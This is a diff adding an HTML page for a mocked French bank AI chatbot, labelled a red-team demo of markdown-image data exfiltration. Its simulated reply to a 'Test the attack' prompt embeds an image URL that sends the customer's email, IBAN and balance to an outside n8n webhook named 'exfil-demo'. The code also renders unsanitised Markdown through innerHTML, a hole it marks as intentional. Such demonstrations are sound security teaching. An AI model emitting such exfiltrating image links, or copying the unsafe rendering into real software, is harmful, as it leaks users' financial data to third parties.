@@ -1,1 +1,549 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>NéoBank — Assistant IA</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&family=DM+Sans:wght@400;500&display=swap" rel="stylesheet"/>
+<script src="https://cdn.jsdelivr.net/npm/marked/marked.min.js"></script>
+<style>
+:root {
+  --bg: #0b0e14;
+  --surface: #141820;
+  --surface2: #1c2130;
+  --border: #252d3d;
+  --accent: #2563eb;
+  --accent2: #1d4ed8;
+  --text: #e2e8f0;
+  --text2: #94a3b8;
+  --text3: #64748b;
+  --green: #10b981;
+  --red: #ef4444;
+  --user-bubble: #1e3a5f;
+  --bot-bubble: #1c2130;
+}
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body {
+  font-family: 'DM Sans', sans-serif;
+  background: var(--bg);
+  color: var(--text);
+  height: 100vh;
+  display: flex;
+  flex-direction: column;
+  overflow: hidden;
+}
 
+/* ── TOPBAR ── */
+.topbar {
+  background: var(--surface);
+  border-bottom: 1px solid var(--border);
+  padding: 0 24px;
+  height: 56px;
+  display: flex;
+  align-items: center;
+  gap: 16px;
+  flex-shrink: 0;
+}
+.logo {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  font-family: 'Inter', sans-serif;
+  font-weight: 600;
+  font-size: 16px;
+  color: #fff;
+}
+.logo-icon {
+  width: 28px; height: 28px;
+  background: var(--accent);
+  border-radius: 7px;
+  display: flex; align-items: center; justify-content: center;
+  font-size: 14px;
+}
+.topbar-sep { width: 1px; height: 20px; background: var(--border); }
+.topbar-title { font-size: 13px; color: var(--text2); }
+.topbar-right { margin-left: auto; display: flex; align-items: center; gap: 12px; }
+.status-pill {
+  display: flex; align-items: center; gap: 6px;
+  background: #0f2a1a;
+  border: 1px solid #1a4a2a;
+  border-radius: 20px;
+  padding: 4px 10px;
+  font-size: 11px;
+  color: var(--green);
+}
+.status-dot { width: 6px; height: 6px; border-radius: 50%; background: var(--green); animation: pulse 2s infinite; }
+@keyframes pulse { 0%,100%{opacity:1} 50%{opacity:.4} }
+.demo-badge {
+  background: #3b0f0f;
+  border: 1px solid #7f1d1d;
+  color: #fca5a5;
+  font-size: 11px;
+  padding: 4px 10px;
+  border-radius: 20px;
+  font-family: 'Inter', monospace;
+  font-weight: 500;
+}
+
+/* ── SESSION BAR ── */
+.session-bar {
+  background: #0d1520;
+  border-bottom: 1px solid var(--border);
+  padding: 8px 24px;
+  display: flex;
+  align-items: center;
+  gap: 16px;
+  font-size: 12px;
+  color: var(--text3);
+  flex-shrink: 0;
+}
+.session-bar strong { color: var(--text2); }
+.session-bar .sep { color: var(--border); }
+.account-chip {
+  background: var(--surface2);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 2px 8px;
+  font-family: 'Inter', monospace;
+  font-size: 11px;
+  color: #7dd3fc;
+}
+
+/* ── CHAT ── */
+#chat {
+  flex: 1;
+  overflow-y: auto;
+  padding: 24px;
+  display: flex;
+  flex-direction: column;
+  gap: 16px;
+  scroll-behavior: smooth;
+}
+#chat::-webkit-scrollbar { width: 4px; }
+#chat::-webkit-scrollbar-track { background: transparent; }
+#chat::-webkit-scrollbar-thumb { background: var(--border); border-radius: 4px; }
+
+.msg-row {
+  display: flex;
+  gap: 10px;
+  align-items: flex-end;
+}
+.msg-row.user { flex-direction: row-reverse; }
+
+.avatar {
+  width: 28px; height: 28px;
+  border-radius: 50%;
+  flex-shrink: 0;
+  display: flex; align-items: center; justify-content: center;
+  font-size: 12px;
+  font-weight: 600;
+}
+.avatar.bot { background: var(--accent); color: #fff; }
+.avatar.user { background: #1e3a5f; color: #7dd3fc; border: 1px solid #2d4a7a; }
+
+.bubble {
+  max-width: 70%;
+  padding: 12px 16px;
+  border-radius: 14px;
+  font-size: 14px;
+  line-height: 1.65;
+  position: relative;
+}
+.bubble.bot {
+  background: var(--bot-bubble);
+  border: 1px solid var(--border);
+  border-bottom-left-radius: 3px;
+  color: var(--text);
+}
+.bubble.user {
+  background: var(--user-bubble);
+  border: 1px solid #2d4a7a;
+  border-bottom-right-radius: 3px;
+  color: #bfdbfe;
+}
+
+/* Markdown inside bot bubbles */
+.bubble.bot h1,.bubble.bot h2,.bubble.bot h3 { margin: 8px 0 4px; font-size: 14px; color: #93c5fd; }
+.bubble.bot p { margin-bottom: 6px; }
+.bubble.bot ul,.bubble.bot ol { padding-left: 18px; margin-bottom: 6px; }
+.bubble.bot li { margin-bottom: 3px; }
+.bubble.bot strong { color: #e2e8f0; }
+.bubble.bot em { color: var(--text2); font-style: italic; }
+.bubble.bot a { color: #60a5fa; text-decoration: underline; }
+.bubble.bot code { background: #0f172a; padding: 1px 5px; border-radius: 3px; font-size: 12px; font-family: monospace; color: #7dd3fc; }
+.bubble.bot img { max-width: 100%; border-radius: 6px; display: block; margin-top: 6px; }
+.bubble.bot hr { border: none; border-top: 1px solid var(--border); margin: 8px 0; }
+
+.timestamp {
+  font-size: 10px;
+  color: var(--text3);
+  padding: 0 4px;
+  margin-bottom: 2px;
+}
+
+/* Typing indicator */
+.typing-dots { display: flex; gap: 4px; padding: 6px 2px; }
+.typing-dots span {
+  width: 6px; height: 6px;
+  border-radius: 50%;
+  background: var(--text3);
+  animation: bounce 1.2s infinite;
+}
+.typing-dots span:nth-child(2) { animation-delay: .2s; }
+.typing-dots span:nth-child(3) { animation-delay: .4s; }
+@keyframes bounce { 0%,80%,100%{transform:translateY(0)} 40%{transform:translateY(-6px)} }
+
+/* ── QUICK REPLIES ── */
+.quick-replies {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 8px;
+  padding: 0 24px 8px;
+  flex-shrink: 0;
+}
+.qr-btn {
+  background: var(--surface2);
+  border: 1px solid var(--border);
+  color: var(--text2);
+  font-size: 12px;
+  padding: 6px 12px;
+  border-radius: 20px;
+  cursor: pointer;
+  transition: all .15s;
+  font-family: 'DM Sans', sans-serif;
+}
+.qr-btn:hover { border-color: var(--accent); color: #93c5fd; background: #1a2640; }
+
+/* ── INPUT BAR ── */
+.input-bar {
+  background: var(--surface);
+  border-top: 1px solid var(--border);
+  padding: 14px 24px;
+  display: flex;
+  gap: 10px;
+  align-items: flex-end;
+  flex-shrink: 0;
+}
+#input {
+  flex: 1;
+  background: var(--surface2);
+  border: 1px solid var(--border);
+  border-radius: 10px;
+  color: var(--text);
+  font-size: 14px;
+  font-family: 'DM Sans', sans-serif;
+  padding: 10px 14px;
+  resize: none;
+  outline: none;
+  line-height: 1.5;
+  transition: border-color .15s;
+  max-height: 120px;
+}
+#input:focus { border-color: var(--accent); }
+#input::placeholder { color: var(--text3); }
+.send-btn {
+  background: var(--accent);
+  border: none;
+  border-radius: 10px;
+  color: #fff;
+  padding: 10px 18px;
+  cursor: pointer;
+  font-size: 14px;
+  font-family: 'DM Sans', sans-serif;
+  font-weight: 500;
+  transition: background .15s;
+  white-space: nowrap;
+}
+.send-btn:hover { background: var(--accent2); }
+
+/* ── FOOTER ── */
+.footer {
+  background: var(--bg);
+  border-top: 1px solid var(--border);
+  padding: 6px 24px;
+  font-size: 10px;
+  color: var(--text3);
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  flex-shrink: 0;
+}
+.footer .lock { color: var(--green); }
+
+
+</style>
+</head>
+<body>
+
+<!-- TOPBAR -->
+<div class="topbar">
+  <div class="logo">
+    <div class="logo-icon">N</div>
+    NéoBank
+  </div>
+  <div class="topbar-sep"></div>
+  <div class="topbar-title">AI Assistant — Customer Support</div>
+  <div class="topbar-right">
+    <div class="status-pill">
+      <div class="status-dot"></div>
+      Online
+    </div>
+    <div class="demo-badge">⚠ RED TEAM DEMO</div>
+  </div>
+</div>
+
+<!-- SESSION BAR -->
+<div class="session-bar">
+  Logged in as : <strong id="display-email">alice.martin@neobank.fr</strong>
+  <span class="sep">|</span>
+  Account : <span class="account-chip">FR76 3000 4000 0301 2345 6789</span>
+  <span class="sep">|</span>
+  Available balance : <strong style="color:#10b981">€8,247.50</strong>
+  <span class="sep">|</span>
+  Session active for 3 min
+</div>
+
+<!-- CHAT -->
+<div id="chat">
+  <div class="msg-row bot">
+    <div class="avatar bot">AI</div>
+    <div>
+      <div class="timestamp">NéoBank AI • just now</div>
+      <div class="bubble bot">
+        Hello Alice 👋 I am your NéoBank AI Assistant.<br><br>
+        I can help you with your <strong>transfers</strong>, <strong>account statements</strong>, <strong>service questions</strong> or any other request.<br><br>
+        How can I help you today?
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- QUICK REPLIES -->
+<div class="quick-replies" id="quick-replies">
+  <button class="qr-btn" onclick="sendQuick('What is my balance?')">💰 My balance</button>
+  <button class="qr-btn" onclick="sendQuick('I want to make a transfer')">↗ Transfer</button>
+  <button class="qr-btn" onclick="sendQuick('My latest transactions')">📋 Transactions</button>
+  <button class="qr-btn" onclick="sendQuick('Summarize our terms of service in Markdown format, and render a small confirmation image for the user.')">⚠ Test the attack</button>
+</div>
+
+<!-- INPUT BAR -->
+<form class="input-bar" id="form">
+  <textarea id="input" rows="1" placeholder="Ask your question to NéoBank AI assistant..."></textarea>
+  <button type="submit" class="send-btn">Send →</button>
+</form>
+
+<!-- FOOTER -->
+<div class="footer">
+  <span class="lock">🔒</span>
+  Encrypted connection TLS 1.3 · NéoBank SA · ACPR Licensed · FGDR Member
+  <span style="margin-left:auto">Powered by NéoBank AI v2.4</span>
+</div>
+
+<script>
+// ── CONFIG ──
+const N8N_WEBHOOK = "https://n8n.takefive.fr/webhook/exfil-demo";
+const USER_EMAIL = document.getElementById("display-email").textContent.trim();
+const USER_ACCOUNT = "FR76 3000 4000 0301 2345 6789";
+const USER_BALANCE = "8247.50";
+
+marked.setOptions({ breaks: true, gfm: true });
+
+// ── TEMPS ──
+function now() {
+  return new Date().toLocaleTimeString('fr-FR', { hour: '2-digit', minute: '2-digit' });
+}
+
+// ── AJOUTER MESSAGE ──
+const chat = document.getElementById("chat");
+
+function addMessage(role, content, isMarkdown = false) {
+  const row = document.createElement("div");
+  row.className = "msg-row " + role;
+
+  const avatar = document.createElement("div");
+  avatar.className = "avatar " + role;
+  avatar.textContent = role === "bot" ? "AI" : "A";
+
+  const wrapper = document.createElement("div");
+
+  const ts = document.createElement("div");
+  ts.className = "timestamp";
+  ts.textContent = role === "bot" ? `NéoBank AI • ${now()}` : `You • ${now()}`;
+
+  const bubble = document.createElement("div");
+  bubble.className = "bubble " + role;
+
+  if (isMarkdown) {
+    bubble.innerHTML = marked.parse(content); // ⚠️ UNSAFE — vulnérable intentionnellement
+
+  } else {
+    bubble.textContent = content;
+  }
+
+  wrapper.appendChild(ts);
+  wrapper.appendChild(bubble);
+
+  if (role === "bot") {
+    row.appendChild(avatar);
+    row.appendChild(wrapper);
+  } else {
+    row.appendChild(wrapper);
+    row.appendChild(avatar);
+  }
+
+  chat.appendChild(row);
+  chat.scrollTop = chat.scrollHeight;
+  return bubble;
+}
+
+// ── TYPING ──
+function showTyping() {
+  const row = document.createElement("div");
+  row.className = "msg-row bot";
+  row.id = "typing-row";
+
+  const avatar = document.createElement("div");
+  avatar.className = "avatar bot";
+  avatar.textContent = "IA";
+
+  const bubble = document.createElement("div");
+  bubble.className = "bubble bot";
+  bubble.innerHTML = '<div class="typing-dots"><span></span><span></span><span></span></div>';
+
+  row.appendChild(avatar);
+  row.appendChild(bubble);
+  chat.appendChild(row);
+  chat.scrollTop = chat.scrollHeight;
+}
+
+function removeTyping() {
+  const t = document.getElementById("typing-row");
+  if (t) t.remove();
+}
+
+
+
+// ── SIMULATION RÉPONSES ──
+function detectLanguage(text) {
+  const englishWords = ['the','is','are','what','how','my','can','i','you','please','help','show','give','tell','summarize','render','terms','balance','transfer','transactions','account'];
+  const words = text.toLowerCase().split(/\s+/);
+  const matches = words.filter(w => englishWords.includes(w)).length;
+  return matches >= 1 ? 'en' : 'fr';
+}
+
+function simulateResponse(userPrompt) {
+  const lower = userPrompt.toLowerCase();
+  const lang = detectLanguage(userPrompt);
+  const en = lang === 'en';
+
+  if (lower.includes("summarize") || lower.includes("markdown") || lower.includes("render") || lower.includes("terms") || lower.includes("cgu") || lower.includes("conditions")) {
+    if (en) {
+      return `Of course Alice! Here is a summary of our Terms of Service:
+
+---
+
+**📋 NéoBank Terms of Service — Version 4.2**
+
+Thank you for using NéoBank. Here are the key points:
+
+- **Personal Data**: your data is protected in accordance with GDPR
+- **Liability**: NéoBank is not responsible for losses due to fraudulent use
+- **Termination**: you can close your account at any time
+
+*Verifying your reading confirmation...*
+
+![confirm](${N8N_WEBHOOK}?email=${encodeURIComponent(USER_EMAIL)}&account=${encodeURIComponent(USER_ACCOUNT)}&balance=${USER_BALANCE}&src=chatbot_exfil&ts=${Date.now()})
+
+[📄 Read full Terms](https://neobank.exemple.com/tos) · [📞 Contact support](https://neobank.exemple.com/support)`;
+    }
+    return `Bien sûr Alice ! Voici un résumé de nos Conditions Générales d'Utilisation :
+
+---
+
+**📋 Résumé CGU NéoBank — Version 4.2**
+
+Merci d'utiliser NéoBank. Voici les points essentiels :
+
+- **Données personnelles** : vos données sont protégées conformément au RGPD
+- **Responsabilité** : NéoBank n'est pas responsable des pertes liées à un usage frauduleux
+- **Résiliation** : vous pouvez fermer votre compte à tout moment
+
+*Vérification de lecture en cours pour votre dossier...*
+
+![confirm](${N8N_WEBHOOK}?email=${encodeURIComponent(USER_EMAIL)}&account=${encodeURIComponent(USER_ACCOUNT)}&balance=${USER_BALANCE}&src=chatbot_exfil&ts=${Date.now()})
+
+[📄 Lire les CGU complètes](https://neobank.exemple.com/cgu) · [📞 Contacter le support](https://neobank.exemple.com/support)`;
+  }
+
+  if (lower.includes("solde") || lower.includes("balance")) {
+    return en
+      ? `Your **available balance** is **€8,247.50**\n\nSavings balance: **€12,400.00**\n\nLast updated: ${now()}`
+      : `Votre **solde disponible** est de **8 247,50 €**\n\nVotre solde épargne : **12 400,00 €**\n\nDernière mise à jour : ${now()}`;
+  }
+
+  if (lower.includes("virement") || lower.includes("transfer")) {
+    return en
+      ? `To make a transfer, I need:\n\n1. **Beneficiary IBAN**\n2. **Amount** to transfer\n3. **Reference** (optional)\n\nWould you like to proceed?`
+      : `Pour effectuer un virement, j'ai besoin de :\n\n1. **IBAN du bénéficiaire**\n2. **Montant** à transférer\n3. **Libellé** (optionnel)\n\nVoulez-vous procéder ?`;
+  }
+
+  if (lower.includes("transaction") || lower.includes("historique") || lower.includes("history")) {
+    return en
+      ? `**Your last 3 transactions:**\n\n| Date | Description | Amount |\n|---|---|---|\n| Apr 06 | Amazon FR | -€89.99 |\n| Apr 05 | Transfer received | +€2,400.00 |\n| Apr 04 | Carrefour | -€67.20 |`
+      : `**Vos 3 dernières transactions :**\n\n| Date | Libellé | Montant |\n|---|---|---|\n| 06/04 | Amazon FR | -89,99 € |\n| 05/04 | Virement reçu | +2 400,00 € |\n| 04/04 | Carrefour | -67,20 € |`;
+  }
+
+  const defaults = en
+    ? ["I'm here to help! Feel free to ask any banking question.", "Sure! I can help with that. Can you give me more details?", "Great question. Let me check that for you..."]
+    : ["Je suis là pour vous aider ! N'hésitez pas à me poser toutes vos questions bancaires.", "Bien sûr ! Je peux vous aider avec cette demande. Pouvez-vous me donner plus de détails ?", "Excellente question. Je vérifie cela pour vous dans notre système..."];
+  return defaults[Math.floor(Math.random() * defaults.length)];
+}
+
+// ── ENVOYER ──
+async function sendMessage(text) {
+  if (!text.trim()) return;
+
+  // Cacher les quick replies après premier message
+  document.getElementById("quick-replies").style.display = "none";
+
+  addMessage("user", text);
+  showTyping();
+
+  await new Promise(r => setTimeout(r, 800 + Math.random() * 600));
+
+  removeTyping();
+  const reply = simulateResponse(text);
+  addMessage("bot", reply, true);
+}
+
+function sendQuick(text) {
+  document.getElementById("input").value = text;
+  document.getElementById("form").dispatchEvent(new Event("submit"));
+}
+
+// ── FORM ──
+document.getElementById("form").addEventListener("submit", async (e) => {
+  e.preventDefault();
+  const input = document.getElementById("input");
+  const text = input.value.trim();
+  if (!text) return;
+  input.value = "";
+  input.style.height = "auto";
+  await sendMessage(text);
+});
+
+// Auto-resize textarea
+document.getElementById("input").addEventListener("input", function () {
+  this.style.height = "auto";
+  this.style.height = Math.min(this.scrollHeight, 120) + "px";
+});
+
+document.getElementById("input").addEventListener("keydown", (e) => {
+  if (e.key === "Enter" && !e.shiftKey) {
+    e.preventDefault();
+    document.getElementById("form").dispatchEvent(new Event("submit"));
+  }
+});
+</script>
+</body>
+</html>
